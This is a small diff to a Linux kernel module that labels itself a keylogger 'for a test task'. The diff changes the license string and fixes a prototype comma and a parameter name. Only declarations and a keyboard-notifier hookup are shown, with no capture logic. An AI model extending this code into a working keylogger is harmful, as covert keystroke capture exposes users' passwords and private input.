@@ -9,7 +9,7 @@
 
 #define BUF_LEN 1024
 
-MODULE_LICENSE("GPL v3");
+MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Ilia Kovalev, <ovceev@protonmail.com>");
 MODULE_VERSION("0.1 pre alpha beta gamma");
 MODULE_DESCRIPTION("Keylogger for a test task");
@@ -23,7 +23,7 @@ static ssize_t read(struct file *filp,
 		    size_t len,
 		    loff_t *offset);
 
-static int cb(struct notifier_block *nb
+static int cb(struct notifier_block *nb,
 	      unsigned long action,
 	      void *data);
 
@@ -81,7 +81,7 @@ static struct notifier_block nb = {
     .notifier_call = cb,
 };
 
-int cb(struct notifier_block *nb,
+int cb(struct notifier_block *nblck,
        unsigned long action,
        void *data)
 {
